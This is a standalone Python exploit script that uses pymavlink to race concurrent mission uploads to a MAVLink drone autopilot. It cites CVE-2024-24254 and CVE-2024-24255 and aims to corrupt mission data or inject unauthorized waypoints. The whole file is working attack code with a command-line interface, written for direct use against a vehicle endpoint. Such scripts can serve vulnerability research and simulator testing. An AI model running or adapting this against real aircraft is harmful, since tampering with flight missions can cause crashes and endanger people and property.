#!/usr/bin/env python3
"""
Mission Race Condition Exploit Script
Exploits CVE-2024-24254 and CVE-2024-24255 race conditions in mission planning
"""

import sys
import time
import threading
from pymavlink import mavutil

def upload_mission_rapidly(connection, waypoints, thread_id):
    """
    Rapidly upload mission (to trigger race condition)
    
    Args:
        connection: MAVLink connection object
        waypoints: List of (lat, lon, alt) tuples
        thread_id: Thread identifier
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print(f"[Thread {thread_id}] Starting rapid mission upload...")
    
    try:
        # Clear existing mission
        connection.mav.mission_clear_all_send(target_system, target_component)
        time.sleep(0.1)
        
        # Send mission count
        connection.mav.mission_count_send(target_system, target_component, len(waypoints))
        
        # Rapidly send waypoints
        for seq, (lat, lon, alt) in enumerate(waypoints):
            connection.mav.mission_item_int_send(
                target_system,
                target_component,
                seq,
                mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
                mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                0, 1 if seq == 0 else 0, 1, 0, 0, 0,
                int(lat * 1e7),
                int(lon * 1e7),
                int(alt)
            )
            time.sleep(0.01)  # Very short delay to trigger race condition
        
        print(f"[Thread {thread_id}] Mission upload complete")
        
    except Exception as e:
        print(f"[Thread {thread_id}] Error: {e}")

def exploit_race_condition(connection, num_threads=3):
    """
    Exploit race condition by sending overlapping mission uploads
    
    Args:
        connection: MAVLink connection object
        num_threads: Number of concurrent upload threads
    
    Returns:
        True if exploit executed
    """
    print(f"[*] CVE-2024-24254 & CVE-2024-24255: Race condition in mission planning")
    print(f"[*] CVSS Score: 4.2 (MEDIUM)")
    print(f"[*] Exploiting with {num_threads} concurrent threads...")
    
    # Create different mission sets for each thread
    missions = []
    for i in range(num_threads):
        # Each thread uploads a different mission
        waypoints = [
            (37.0 + i*0.1, -122.0 + i*0.1, 10 + i*5),
            (37.1 + i*0.1, -122.1 + i*0.1, 20 + i*5),
            (37.2 + i*0.1, -122.2 + i*0.1, 30 + i*5)
        ]
        missions.append(waypoints)
    
    # Create multiple connections (one per thread)
    connections = []
    connection_string = connection.connection_string
    
    for i in range(num_threads):
        try:
            conn = mavutil.mavlink_connection(connection_string)
            conn.wait_heartbeat(timeout=2)
            connections.append(conn)
        except Exception as e:
            print(f"[-] Failed to create connection {i}: {e}")
    
    if not connections:
        print("[-] No connections available")
        return False
    
    # Start concurrent uploads
    threads = []
    for i, conn in enumerate(connections):
        thread = threading.Thread(
            target=upload_mission_rapidly,
            args=(conn, missions[i], i)
        )
        thread.start()
        threads.append(thread)
    
    # Wait for all threads
    for thread in threads:
        thread.join()
    
    print("[+] Race condition exploit completed")
    print("[!] Check mission for:")
    print("    - Overlapping waypoints")
    print("    - Corrupted mission data")
    print("    - Unauthorized waypoints")
    
    return True

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 mission_race_condition.py <connection> [num_threads]")
        print("Example: python3 mission_race_condition.py udp:127.0.0.1:14550")
        print("Example: python3 mission_race_condition.py udp:127.0.0.1:14550 5")
        print("\nCVE-2024-24254 & CVE-2024-24255: Race conditions in mission planning")
        print("CVSS Score: 4.2 (MEDIUM)")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    num_threads = int(sys.argv[2]) if len(sys.argv) > 2 else 3
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Execute race condition exploit
    success = exploit_race_condition(connection, num_threads)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
